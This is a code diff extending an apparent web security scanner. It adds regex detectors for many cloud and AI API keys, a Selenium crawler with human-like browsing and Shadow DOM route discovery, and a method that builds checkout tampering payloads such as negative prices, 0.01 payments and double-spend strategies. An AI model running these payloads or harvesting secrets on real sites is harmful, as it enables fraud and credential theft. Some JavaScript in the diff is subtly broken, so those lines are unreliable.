+        'Twitter API Key': r'(?i)twitter[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{25}["\']?',
+        'Twitter API Secret': r'(?i)twitter[_\-.]?api[_\-.]?secret["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{50}["\']?',
+        'Twitter Access Token': r'(?i)twitter[_\-.]?access[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{50}["\']?',
+        'Twitter Access Secret': r'(?i)twitter[_\-.]?access[_\-.]?secret["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{45}["\']?',
+        'LinkedIn Client ID': r'(?i)linkedin[_\-.]?client[_\-.]?id["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{14}["\']?',
+        'LinkedIn Client Secret': r'(?i)linkedin[_\-.]?client[_\-.]?secret["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{16}["\']?',
+        'Azure Storage Key': r'(?i)azure[_\-.]?storage[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9+/]{88}==["\']?',
+        'Azure Subscription Key': r'(?i)azure[_\-.]?subscription[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{32}["\']?',
+        'Heroku API Key': r'(?i)heroku[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{32}["\']?',
+        'Auth0 Client Secret': r'(?i)auth0[_\-.]?client[_\-.]?secret["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{64}["\']?',
+        'SendGrid API Key': r'(?i)sendgrid[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?SG\.[A-Za-z0-9\-_]{46}["\']?',
+        'Mailgun API Key': r'(?i)mailgun[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?key-[A-Za-z0-9]{32}["\']?',
+        'CircleCI Token': r'(?i)circle[_\-.]?ci[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{40}["\']?',
+        'Datadog API Key': r'(?i)datadog[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{32}["\']?',
+        'Datadog Application Key': r'(?i)datadog[_\-.]?application[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{40}["\']?',
+        'New Relic License Key': r'(?i)new[_\-.]?relic[_\-.]?license[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{40}["\']?',
+        'PagerDuty API Key': r'(?i)pagerduty[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{20}["\']?',
+        'SonarQube Token': r'(?i)sonar[_\-.]?qube[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{40}["\']?',
+        'Splunk Token': r'(?i)splunk[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{64}["\']?',
+        'NPM Token': r'(?i)npm[_\-.]?token["\']?\s*[:=]\s*["\']?NPM_[A-Za-z0-9\-_]{36}["\']?',
+        'PyPI Token': r'(?i)pypi[_\-.]?token["\']?\s*[:=]\s*["\']?pypi-[A-Za-z0-9\-_]{36}["\']?',
+        'RubyGems API Key': r'(?i)rubygems[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{32}["\']?',
+        'Clojars Token': r'(?i)clojars[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{64}["\']?',
+        'Atlassian API Token': r'(?i)atlassian[_\-.]?api[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{24}["\']?',
+        'Confluence API Token': r'(?i)confluence[_\-.]?api[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{24}["\']?',
+        'Jira API Token': r'(?i)jira[_\-.]?api[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{24}["\']?',
+        'Bitbucket Token': r'(?i)bitbucket[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{64}["\']?',
+        'DigitalOcean Token': r'(?i)digital[_\-.]?ocean[_\-.]?token["\']?\s*[:=]\s*["\']?dop_v1_[A-Za-z0-9]{64}["\']?',
+        'Linode API Key': r'(?i)linode[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{64}["\']?',
+        'Cloudflare API Key': r'(?i)cloudflare[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{37}["\']?',
+        'Cloudflare Account ID': r'(?i)cloudflare[_\-.]?account[_\-.]?id["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{32}["\']?',
+        'OpenAI API Key': r'(?i)openai[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?sk-[A-Za-z0-9]{48}["\']?',
+        'Anthropic API Key': r'(?i)anthropic[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?sk-ant-[A-Za-z0-9\-_]{95}["\']?',
+        'HuggingFace Token': r'(?i)hugging[_\-.]?face[_\-.]?token["\']?\s*[:=]\s*["\']?hf_[A-Za-z0-9]{34}["\']?',
+        'Cohere API Key': r'(?i)cohere[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{40}["\']?',
+        'Replicate API Key': r'(?i)replicate[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?r8_[A-Za-z0-9\-_]{32}["\']?',
+    }
+    
+    def __init__(self):
+        self.compiled_patterns = {}
+        self._compile_patterns()
+    
+    def _compile_patterns(self):
+        """Pre-compile regex patterns for better performance."""
+        for secret_type, pattern in self.SECRET_PATTERNS.items():
+            try:
+                self.compiled_patterns[secret_type] = re.compile(pattern, re.IGNORECASE | re.MULTILINE)
+            except re.error as e:
+                logging.warning(f"Failed to compile pattern for {secret_type}: {e}")
+    
+    def scan_content(self, content: str, url: str = None) -> List[Dict[str, Any]]:
+        """
+        Scan content for secrets using regex patterns.
+        
+        Args:
+            content: The content to scan (HTML, JS, JSON, etc.)
+            url: Optional URL where the content was found
+        
+        Returns:
+            List of detected secrets with metadata
+        """
+        secrets_found = []
+        
+        if not content or not isinstance(content, str):
+            return secrets_found
+        
+        for secret_type, pattern in self.compiled_patterns.items():
+            try:
+                matches = pattern.finditer(content)
+                for match in matches:
+                    secret_value = match.group()
+                    start_pos = match.start()
+                    end_pos = match.end()
+                    
+                    # Get context around the match
+                    context_start = max(0, start_pos - 50)
+                    context_end = min(len(content), end_pos + 50)
+                    context = content[context_start:context_end]
+                    
+                    # Truncate the secret value for logging (show first and last 4 chars)
+                    masked_value = self._mask_secret(secret_value)
+                    
+                    secrets_found.append({
+                        'secret_type': secret_type,
+                        'secret_value': masked_value,
+                        'raw_value': secret_value,  # Keep raw for analysis
+                        'position': (start_pos, end_pos),
+                        'context': context,
+                        'url': url,
+                        'timestamp': datetime.now().isoformat(),
+                        'severity': self._get_severity(secret_type)
+                    })
+                    
+                    logging.warning(f"Secret detected: {secret_type} at {url or 'unknown'} - {masked_value}")
+                    
+            except Exception as e:
+                logging.warning(f"Error scanning for {secret_type}: {e}")
+        
+        return secrets_found
+    
+    def _mask_secret(self, secret: str, max_chars: int = 8) -> str:
+        """Mask secret value for safe logging."""
+        if len(secret) <= max_chars:
+            return '*' * len(secret)
+        return secret[:4] + '*' * (len(secret) - 8) + secret[-4:]
+    
+    def _get_severity(self, secret_type: str) -> str:
+        """Determine severity level based on secret type."""
+        critical_types = [
+            'AWS Access Key', 'AWS Secret Key', 'Private Key', 'RSA Private Key',
+            'EC Private Key', 'PGP Private Key', 'SSH Private Key', 'API Key',
+            'API Secret', 'API Token', 'JWT Token', 'Database Connection String'
+        ]
+        
+        if secret_type in critical_types:
+            return 'CRITICAL'
+        elif 'token' in secret_type.lower() or 'key' in secret_type.lower():
+            return 'HIGH'
+        else:
+            return 'MEDIUM'
+    
+    def scan_html(self, html_content: str, url: str = None) -> List[Dict[str, Any]]:
+        """Scan HTML content for secrets in scripts, comments, and attributes."""
+        secrets = []
+        
+        # Scan script tags content
+        script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)
+        for match in script_pattern.finditer(html_content):
+            script_content = match.group(1)
+            secrets.extend(self.scan_content(script_content, url))
+        
+        # Scan HTML comments
+        comment_pattern = re.compile(r'<!--(.*?)-->', re.DOTALL)
+        for match in comment_pattern.finditer(html_content):
+            comment_content = match.group(1)
+            secrets.extend(self.scan_content(comment_content, url))
+        
+        # Scan inline JavaScript in event handlers
+        event_handler_pattern = re.compile(r'on\w+\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE)
+        for match in event_handler_pattern.finditer(html_content):
+            handler_content = match.group(1)
+            secrets.extend(self.scan_content(handler_content, url))
+        
+        # Scan data attributes (often contain JSON/keys)
+        data_attr_pattern = re.compile(r'data-[a-z-]+\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE)
+        for match in data_attr_pattern.finditer(html_content):
+            data_content = match.group(1)
+            secrets.extend(self.scan_content(data_content, url))
+        
+        return secrets
+    
+    def scan_json(self, json_content: str, url: str = None) -> List[Dict[str, Any]]:
+        """Scan JSON content for secrets in values."""
+        secrets = []
+        
+        try:
+            data = json.loads(json_content)
+            json_str = json.dumps(data, separators=(',', ':'))  # Compact for scanning
+            secrets.extend(self.scan_content(json_str, url))
+        except json.JSONDecodeError:
+            # If not valid JSON, still scan as plain text
+            secrets.extend(self.scan_content(json_content, url))
+        
+        return secrets
+    
+    def scan_javascript(self, js_content: str, url: str = None) -> List[Dict[str, Any]]:
+        """Scan JavaScript content for secrets in variables, constants, and objects."""
+        secrets = []
+        
+        # Scan for common patterns in JS
+        js_patterns = [
+            r'(?:const|let|var)\s+[a-zA-Z_$][a-zA-Z0-9_$]*\s*=\s*["\']([A-Za-z0-9\-_]{20,})["\']',
+            r'(?:const|let|var)\s+[a-zA-Z_$][a-zA-Z0-9_$]*\s*=\s*`([^`]{20,})`',
+            r'[a-zA-Z_$][a-zA-Z0-9_$]*\s*:\s*["\']([A-Za-z0-9\-_]{20,})["\']',
+            r'[a-zA-Z_$][a-zA-Z0-9_$]*\s*:\s*`([^`]{20,})`',
+        ]
+        
+        for pattern in js_patterns:
+            try:
+                compiled = re.compile(pattern, re.MULTILINE)
+                for match in compiled.finditer(js_content):
+                    value = match.group(1) if match.lastindex >= 1 else match.group(0)
+                    secrets.extend(self.scan_content(value, url))
+            except re.error:
+                continue
+        
+        # Also do general scan
+        secrets.extend(self.scan_content(js_content, url))
+        
+        return secrets
+
+
 class JSRenderDriver:
     def __init__(self, proxy=None, proxy_pool=None, human_like_behavior=True):
         self.driver = None
@@ -11537,12 +12647,83 @@ class JSRenderDriver:
         self.websocket_messages = deque(maxlen=500)  # Store WebSocket messages
         self.websocket_monitoring_enabled = False  # WebSocket monitoring flag
         self.shadow_dom_enabled = True  # Enable Shadow DOM crawling
+        
+        # Enhanced SPA route discovery
+        self.discovered_routes = set()  # Store all discovered routes
+        self.route_transitions = []  # Track route transitions for FSM learning
+        self.framework_routers = {}  # Store detected framework router information
+        self.cdp_event_listeners = {}  # Track active CDP event listeners
+        self.passive_route_monitoring = False  # Enable passive route monitoring
+        
+        # Secret scanning integration
+        self.secret_scanner = SecretScanner()
+        self.discovered_secrets = []  # Store discovered secrets during crawling
     def __enter__(self):
         self.create()
         return self
+    
     def __exit__(self, exc_type, exc_val, exc_tb):
         self.quit()
+        # Ensure Chrome processes are cleaned up even on hard exceptions
+        self._force_cleanup_chrome_processes()
         return False
+    
+    def _force_cleanup_chrome_processes(self):
+        """Force cleanup of any zombie Chrome processes."""
+        if not PSUTIL_AVAILABLE:
+            logging.debug("psutil not available, skipping advanced Chrome process cleanup")
+            return
+            
+        try:
+            # Get current process to avoid killing parent Chrome instances
+            current_pid = os.getpid()
+            parent = psutil.Process(current_pid)
+            
+            # Find and terminate Chrome driver processes that are children of our process
+            for child in parent.children(recursive=True):
+                try:
+                    if 'chrome' in child.name().lower() or 'chromedriver' in child.name().lower():
+                        logging.info(f"Terminating zombie Chrome process: {child.pid} ({child.name()})")
+                        child.terminate()
+                        # Wait up to 3 seconds for graceful termination
+                        try:
+                            child.wait(timeout=3)
+                        except psutil.TimeoutExpired:
+                            # Force kill if graceful termination fails
+                            logging.warning(f"Force killing Chrome process: {child.pid}")
+                            child.kill()
+                except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
+                    logging.debug(f"Could not terminate process {child.pid}: {e}")
+        except Exception as e:
+            logging.warning(f"Error during Chrome process cleanup: {e}")
+    
+    def get_discovered_secrets(self) -> List[Dict[str, Any]]:
+        """Get all secrets discovered during crawling."""
+        with self.lock:
+            return list(self.discovered_secrets)
+    
+    def clear_discovered_secrets(self):
+        """Clear the discovered secrets list."""
+        with self.lock:
+            self.discovered_secrets.clear()
+    
+    def get_secret_summary(self) -> Dict[str, Any]:
+        """Get a summary of discovered secrets grouped by type and severity."""
+        with self.lock:
+            summary = {
+                'total_secrets': len(self.discovered_secrets),
+                'by_type': defaultdict(int),
+                'by_severity': defaultdict(int),
+                'by_url': defaultdict(int)
+            }
+            
+            for secret in self.discovered_secrets:
+                summary['by_type'][secret['secret_type']] += 1
+                summary['by_severity'][secret['severity']] += 1
+                if secret['url']:
+                    summary['by_url'][secret['url']] += 1
+            
+            return dict(summary)
     def create(self):
         opts = Options()
         opts.add_argument("--headless")
@@ -11609,6 +12790,9 @@ class JSRenderDriver:
                 # Enable WebSocket monitoring
                 self._enable_websocket_monitoring()
                 
+                # Enable enhanced SPA route monitoring
+                self._enable_spa_route_monitoring()
+                
             except Exception as cdp_error:
                 logging.warning(f"CDP network monitoring unavailable: {cdp_error}")
             return True
@@ -11628,9 +12812,36 @@ class JSRenderDriver:
         except Exception as e:
             logging.warning(f"CDP response body error: {e}")
             b = ''
+        
+        # Scan response body for secrets
+        secrets_found = []
+        if b:
+            try:
+                content_type = data['response'].get('mimeType', '')
+                url = data['response']['url']
+                
+                # Scan based on content type
+                if 'html' in content_type.lower():
+                    secrets_found = self.secret_scanner.scan_html(b, url)
+                elif 'json' in content_type.lower():
+                    secrets_found = self.secret_scanner.scan_json(b, url)
+                elif 'javascript' in content_type.lower() or 'js' in content_type.lower():
+                    secrets_found = self.secret_scanner.scan_javascript(b, url)
+                else:
+                    # Generic scan for other content types
+                    secrets_found = self.secret_scanner.scan_content(b, url)
+                
+                # Store discovered secrets
+                if secrets_found:
+                    with self.lock:
+                        self.discovered_secrets.extend(secrets_found)
+                        
+            except Exception as scan_error:
+                logging.warning(f"Secret scanning error for {data['response']['url']}: {scan_error}")
+        
         with self.lock:
             parsed_params = self._extract_json_parameters(b) if b else []
-            self.captured_requests.append({'type': 'response', 'url': data['response']['url'], 'status': data['response']['status'], 'body': b, 'parameters': parsed_params})
+            self.captured_requests.append({'type': 'response', 'url': data['response']['url'], 'status': data['response']['status'], 'body': b, 'parameters': parsed_params, 'secrets': secrets_found})
     def _extract_json_parameters(self, body, prefix=''):
         params = []
         try:
@@ -11664,6 +12875,10 @@ class JSRenderDriver:
             self.driver.get(url)
             WebDriverWait(self.driver, 15.0).until(EC.presence_of_element_located((By.TAG_NAME, "body")))  # Increased from 5 to 15.0
             
+            # Wait for SPA-specific loading
+            self._wait_for_network_idle()
+            self._wait_for_dynamic_content()
+            
             # Simulate human-like behavior after page load if enabled
             if self.human_like_behavior and random.random() < 0.8:  # 80% chance to perform human-like actions
                 # Random initial scroll to simulate user scanning the page
@@ -11678,17 +12893,49 @@ class JSRenderDriver:
                     scroll_dir = random.choice(['up', 'down'])
                     self._natural_scroll(random.randint(15, 30), scroll_dir)
             
-            return self.driver.page_source
+            page_source = self.driver.page_source
+            
+            # Scan page source for secrets
+            try:
+                secrets_found = self.secret_scanner.scan_html(page_source, url)
+                if secrets_found:
+                    with self.lock:
+                        self.discovered_secrets.extend(secrets_found)
+                    logging.info(f"Found {len(secrets_found)} secrets in page source: {url}")
+            except Exception as scan_error:
+                logging.warning(f"Secret scanning error for page source {url}: {scan_error}")
+            
+            return page_source
         except TimeoutException:
             logging.warning(f"Selenium page load timeout for {url}, attempting to get current page source")
             try:
-                return self.driver.page_source if self.driver else ""
+                page_source = self.driver.page_source if self.driver else ""
+                # Still attempt secret scanning even on timeout
+                if page_source:
+                    try:
+                        secrets_found = self.secret_scanner.scan_html(page_source, url)
+                        if secrets_found:
+                            with self.lock:
+                                self.discovered_secrets.extend(secrets_found)
+                    except Exception:
+                        pass
+                return page_source
             except Exception:
                 return ""
         except Exception as e:
             logging.warning(f"Selenium get error: {e}")
             try:
-                return self.driver.page_source if self.driver else ""
+                page_source = self.driver.page_source if self.driver else ""
+                # Still attempt secret scanning even on error
+                if page_source:
+                    try:
+                        secrets_found = self.secret_scanner.scan_html(page_source, url)
+                        if secrets_found:
+                            with self.lock:
+                                self.discovered_secrets.extend(secrets_found)
+                    except Exception:
+                        pass
+                return page_source
             except Exception:
                 return ""
     def check_alerts(self):
@@ -11733,6 +12980,10 @@ class JSRenderDriver:
             self.driver.get(url)
             WebDriverWait(self.driver, 15.0).until(EC.presence_of_element_located((By.TAG_NAME, "body")))  # Increased from 5 to 15.0
             
+            # Wait for initial page load and dynamic content
+            self._wait_for_network_idle()
+            self._wait_for_dynamic_content()
+            
             # Initial natural scroll to simulate user reading the page (if human-like behavior enabled)
             if self.human_like_behavior and random.random() < 0.7:  # 70% chance to scroll initially
                 self._natural_scroll(random.randint(100, 300), 'down')
@@ -11742,13 +12993,28 @@ class JSRenderDriver:
             if microfrontend_info:
                 logging.info(f"Found {len(microfrontend_info)} microfrontend components")
 
-            # Get regular SPA links
-            spa_links = self.driver.find_elements(By.XPATH, "//a[contains(@href, '#!') or contains(@href, '#/')]")
+            # Get regular SPA links (both hash-based and HTML5 History API)
+            spa_links = self.driver.find_elements(By.XPATH, "//a[contains(@href, '#!') or contains(@href, '#/') or not(contains(@href, '://'))]")
             
-            # Add Shadow DOM links if enabled
+            # Filter for HTML5 History API links (clean URLs without external domains)
+            clean_url_links = []
+            for link in spa_links:
+                try:
+                    href = link.get_attribute('href')
+                    if href and not any(x in href for x in ['://', '#', 'mailto:', 'tel:']):
+                        # Clean URL likely using HTML5 History API
+                        parsed = urlparse(href)
+                        if not parsed.scheme and not parsed.netloc:
+                            clean_url_links.append(link)
+                except Exception:
+                    pass
+            
+            spa_links.extend(clean_url_links)
+            
+            # Add Shadow DOM links if enabled (with dynamic content waiting)
             if self.shadow_dom_enabled:
                 try:
-                    shadow_clickable = self._query_shadow_dom()
+                    shadow_clickable = self._query_shadow_dom(wait_for_dynamic=True)
                     shadow_links = [elem for elem in shadow_clickable if hasattr(elem, 'tag_name') and elem.tag_name.lower() == 'a']
                     spa_links.extend(shadow_links)
                     logging.info(f"Added {len(shadow_links)} Shadow DOM links to SPA routes")
@@ -11763,24 +13029,42 @@ class JSRenderDriver:
                 try:
                     href = link.get_attribute('href')
                     if href and href not in self.spa_routes_clicked:
+                        previous_url = self.driver.current_url
+                        
                         # Use human-like click if enabled, otherwise direct click
                         if self.human_like_behavior:
-                            if self._human_like_click(link):
+                            if self._human_like_click(link, wait_for_navigation=False):
                                 self.spa_routes_clicked.add(href)
                                 clicked.append(href)
                                 self.log(f"Clicked SPA route: {href}")
+                                
+                                # Wait for router navigation and network requests
+                                self._wait_for_router_navigation()
+                                self._wait_for_network_idle()
+                                self._wait_for_dynamic_content()
                                 
                                 # Random scroll between clicks to simulate reading
                                 if random.random() < 0.3:
                                     scroll_dir = random.choice(['up', 'down'])
                                     self._natural_scroll(random.randint(50, 200), scroll_dir)
                         else:
-                            # Fallback to original behavior
+                            # Fallback to original behavior with enhanced waiting
                             self.driver.execute_script("arguments[0].click();", link)
-                            time.sleep(0.5)
+                            time.sleep(0.3)  # Small delay for basic animation
+                            
+                            # Wait for router navigation and network requests
+                            self._wait_for_router_navigation()
+                            self._wait_for_network_idle()
+                            self._wait_for_dynamic_content()
+                            
                             self.spa_routes_clicked.add(href)
                             clicked.append(href)
                             self.log(f"Clicked SPA route: {href}")
+                            
+                            # Check if URL actually changed (router navigation)
+                            current_url = self.driver.current_url
+                            if current_url != previous_url:
+                                logging.info(f"Router navigation detected: {previous_url} -> {current_url}")
                 except Exception as e:
                     logging.warning(f"SPA click error: {e}")
             return clicked
@@ -11790,16 +13074,18 @@ class JSRenderDriver:
     def log(self, msg):
         logging.info(msg)
     
-    def _query_shadow_dom(self, element=None, max_depth=10):
+    def _query_shadow_dom(self, element=None, max_depth=10, wait_for_dynamic=True, detect_lazy_routes=True):
         """
         Recursively query Shadow DOM to find clickable elements hidden inside Web Components.
         
         This enables crawling of modern SPAs (React 18, Lit, Angular) that hide 70% of their 
-        routes inside Shadow DOM. The current SPA crawler is blind to them without this.
+        routes inside Shadow DOM. Enhanced with lazy-loaded route detection.
         
         Args:
             element: Starting element (uses document root if None)
             max_depth: Maximum recursion depth to prevent infinite loops
+            wait_for_dynamic: Whether to wait for dynamically loaded Shadow DOM trees
+            detect_lazy_routes: Whether to detect lazy-loaded routes in Shadow DOM
             
         Returns:
             list: All clickable elements found in Shadow DOM
@@ -11808,42 +13094,110 @@ class JSRenderDriver:
             return []
             
         try:
-            # JavaScript to recursively traverse Shadow DOM
+            # Wait for dynamically loaded Shadow DOM trees if enabled
+            if wait_for_dynamic:
+                self._wait_for_dynamic_shadow_dom()
+            
+            # Enhanced JavaScript to recursively traverse Shadow DOM with lazy route detection
             shadow_dom_script = """
-            function queryShadowDOM(element, maxDepth, currentDepth) {
+            function queryShadowDOM(element, maxDepth, currentDepth, detectLazyRoutes) {
                 if (currentDepth > maxDepth) return [];
                 
                 if (!element) element = document.documentElement;
                 
                 let clickableElements = [];
+                let lazyRoutes = [];
                 
                 // Check if element has shadow root
                 if (element.shadowRoot) {
                     // Query shadow root for clickable elements
                     const shadowClickable = element.shadowRoot.querySelectorAll(
-                        'a, button, input[type="submit"], input[type="button"], [onclick], [role="button"]'
+                        'a, button, input[type="submit"], input[type="button"], [onclick], [role="button"], [data-testid], [data-cy]'
                     );
                     clickableElements.push(...Array.from(shadowClickable));
                     
+                    // Lazy-loaded route detection
+                    if (detectLazyRoutes) {
+                        // Look for route indicators in Shadow DOM
+                        const routeElements = element.shadowRoot.querySelectorAll('[route], [href], [to], [data-route]');
+                        routeElements.forEach(el => {
+                            const route = el.getAttribute('route') || el.getAttribute('href') || el.getAttribute('to') || el.getAttribute('data-route');
+                            if (route) {
+                                lazyRoutes.push({
+                                    path: route,
+                                    element: el.tagName,
+                                    source: 'shadow_dom'
+                                });
+                            }
+                        });
+                        
+                        // Look for component-based routing patterns
+                        const componentElements = element.shadowRoot.querySelectorAll('[*="route"], [*="path"]');
+                        componentElements.forEach(el => {
+                            // Check for framework-specific routing attributes
+                            for (let attr of el.attributes) {
+                                if (attr.name.includes('route') || attr.name.includes('path') || attr.name.includes('link')) {
+                                    lazyRoutes.push({
+                                        path: attr.value,
+                                        element: el.tagName,
+                                        attribute: attr.name,
+                                        source: 'shadow_dom_component'
+                                    });
+                                }
+                            }
+                        });
+                    }
+                    
                     // Recursively query shadow DOM within shadow root
                     for (let child of element.shadowRoot.children) {
-                        clickableElements.push(...queryShadowDOM(child, maxDepth, currentDepth + 1));
+                        const childResult = queryShadowDOM(child, maxDepth, currentDepth + 1, detectLazyRoutes);
+                        clickableElements.push(...childResult.elements);
+                        lazyRoutes.push(...childResult.lazyRoutes);
                     }
                 }
                 
                 // Check all children for shadow roots
                 for (let child of element.children) {
-                    clickableElements.push(...queryShadowDOM(child, maxDepth, currentDepth + 1));
+                    const childResult = queryShadowDOM(child, maxDepth, currentDepth + 1, detectLazyRoutes);
+                    clickableElements.push(...childResult.elements);
+                    lazyRoutes.push(...childResult.lazyRoutes);
                 }
                 
-                return clickableElements;
+                return {
+                    elements: clickableElements,
+                    lazyRoutes: lazyRoutes
+                };
             }
             
-            return queryShadowDOM(arguments[0], arguments[1], 0);
+            const result = queryShadowDOM(arguments[0], arguments[1], 0, arguments[2]);
+            
+            // Store lazy routes globally for later access
+            if (result.lazyRoutes && result.lazyRoutes.length > 0) {
+                window.__shadow_dom_lazy_routes = window.__shadow_dom_lazy_routes || [];
+                window.__shadow_dom_lazy_routes.push(...result.lazyRoutes);
+            }
+            
+            return result.elements;
             """
             
-            # Execute the Shadow DOM query script
-            elements = self.driver.execute_script(shadow_dom_script, element, max_depth)
+            # Execute the enhanced Shadow DOM query script
+            elements = self.driver.execute_script(shadow_dom_script, element, max_depth, detect_lazy_routes)
+            
+            # Get discovered lazy routes
+            if detect_lazy_routes:
+                try:
+                    lazy_routes_script = """
+                    return window.__shadow_dom_lazy_routes || [];
+                    """
+                    lazy_routes = self.driver.execute_script(lazy_routes_script)
+                    if lazy_routes:
+                        for route in lazy_routes:
+                            if isinstance(route, dict):
+                                route_key = route.get('path') or str(route)
+                                self.discovered_routes.add(route_key)
+                        logging.info(f"Discovered {len(lazy_routes)} lazy-loaded routes in Shadow DOM")
+                except Exception as e:
+                    logging.debug(f"Failed to retrieve lazy routes from Shadow DOM: {e}")
             
             logging.info(f"Found {len(elements)} clickable elements in Shadow DOM")
             return elements
@@ -11852,12 +13206,326 @@ class JSRenderDriver:
             logging.warning(f"Shadow DOM query error: {e}")
             return []
     
-    def _get_all_clickable_elements(self, include_shadow_dom=True):
+    def inject_state_transition_payload(self, fsm_context, current_state, payload_type='race_condition'):
+        """
+        Inject vulnerability payloads at optimal state transition points.
+        
+        This method uses the FSM to determine the best timing and injection points
+        for state-transition-aware vulnerability testing.
+        
+        Args:
+            fsm_context: BusinessLogicFSM instance
+            current_state: Current business logic state
+            payload_type: Type of payload to inject (race_condition, price_tampering, etc.)
+            
+        Returns:
+            Dictionary with injection strategy and timing information
+        """
+        if not fsm_context:
+            return None
+        
+        try:
+            # Get optimal injection point from FSM
+            injection_point = fsm_context.get_optimal_race_injection_point(current_state)
+            if not injection_point:
+                return None
+            
+            # Determine injection strategy based on state and payload type
+            injection_strategy = {
+                'state': current_state,
+                'injection_point': injection_point['window'],
+                'timing': injection_point['timing'],
+                'payloads': injection_point['payloads'],
+                'time_deltas': injection_point['time_deltas'],
+                'confidence': injection_point['confidence'],
+                'strategy': self._determine_injection_strategy(current_state, payload_type)
+            }
+            
+            # Add state-specific payload modifications
+            injection_strategy['modified_payloads'] = self._modify_payloads_for_state(
+                injection_point['payloads'], current_state, payload_type
+            )
+            
+            logging.info(f"State-transition payload injection strategy: {injection_strategy['strategy']}")
+            return injection_strategy
+            
+        except Exception as e:
+            logging.warning(f"State transition payload injection error: {e}")
+            return None
+    
+    def _determine_injection_strategy(self, current_state, payload_type):
+        """Determine the optimal injection strategy for current state and payload type."""
+        strategies = {
+            'cart': {
+                'race_condition': 'concurrent_cart_modification',
+                'price_tampering': 'price_parameter_manipulation',
+                'quantity_manipulation': 'quantity_overflow'
+            },
+            'checkout': {
+                'race_condition': 'payment_race_condition',
+                'price_tampering': 'subtotal_manipulation',
+                'csrf_bypass': 'token_omission'
+            },
+            'payment': {
+                'race_condition': 'double_spend_attack',
+                'payment_tampering': 'amount_manipulation',
+                'idempotency_violation': 'payment_replay'
+            },
+            'confirm': {
+                'race_condition': 'finalization_race',
+                'state_confusion': 'status_manipulation'
+            }
+        }
+        
+        return strategies.get(current_state, {}).get(payload_type, 'generic_injection')
+    
+    def _modify_payloads_for_state(self, base_payloads, current_state, payload_type):
+        """Modify payloads based on current state and payload type."""
+        modified_payloads = []
+        
+        for payload in base_payloads:
+            if current_state == 'cart' and payload_type == 'price_tampering':
+                # Add cart-specific price manipulation
+                modified_payloads.append(f"{payload}&price=-100")
+                modified_payloads.append(f"{payload}&discount=100%")
+            elif current_state == 'checkout' and payload_type == 'race_condition':
+                # Add checkout-specific race condition payloads
+                modified_payloads.append(f"{payload}&concurrent=true")
+                modified_payloads.append(f"{payload}&lock_bypass=true")
+            elif current_state == 'payment' and payload_type == 'payment_tampering':
+                # Add payment-specific tampering
+                modified_payloads.append(f"{payload}&amount=0.01")
+                modified_payloads.append(f"{payload}&currency=USD")
+            else:
+                modified_payloads.append(payload)
+        
+        return modified_payloads
+    
+    def _wait_for_dynamic_shadow_dom(self, timeout=10):
+        """
+        Wait for dynamically loaded Shadow DOM trees to be created.
+        
+        Many modern web components create Shadow DOM trees dynamically after user interaction
+        or route changes. This method waits for these dynamic trees to be created.
+        
+        Args:
+            timeout: Maximum time to wait in seconds
+        """
+        if not self.driver:
+            return
+            
+        try:
+            # JavaScript to wait for dynamic Shadow DOM creation
+            wait_script = """
+            return new Promise((resolve) => {
+                const initialShadowCount = document.querySelectorAll('*').filter(el => el.shadowRoot).length;
+                let checkCount = 0;
+                const maxChecks = 20;
+                const checkInterval = 100; // 100ms
+                
+                const checkForNewShadow = () => {
+                    checkCount++;
+                    const currentShadowCount = document.querySelectorAll('*').filter(el => el.shadowRoot).length;
+                    
+                    if (currentShadowCount > initialShadowCount || checkCount >= maxChecks) {
+                        resolve(currentShadowCount);
+                    } else {
+                        setTimeout(checkForNewShadow, checkInterval);
+                    }
+                };
+                
+                checkForNewShadow();
+            });
+            """
+            
+            self.driver.set_script_timeout(timeout * 1000)
+            shadow_count = self.driver.execute_async_script(wait_script)
+            logging.info(f"Dynamic Shadow DOM check completed. Found {shadow_count} shadow roots")
+            
+        except Exception as e:
+            logging.warning(f"Error waiting for dynamic Shadow DOM: {e}")
+    
+    def _wait_for_router_navigation(self, timeout=15):
+        """
+        Wait for React/Vue router navigation to complete.
+        
+        Modern SPAs use client-side routing (React Router, Vue Router) that updates the URL
+        without page reloads. This method waits for the router to complete navigation.
+        
+        Args:
+            timeout: Maximum time to wait in seconds
+        """
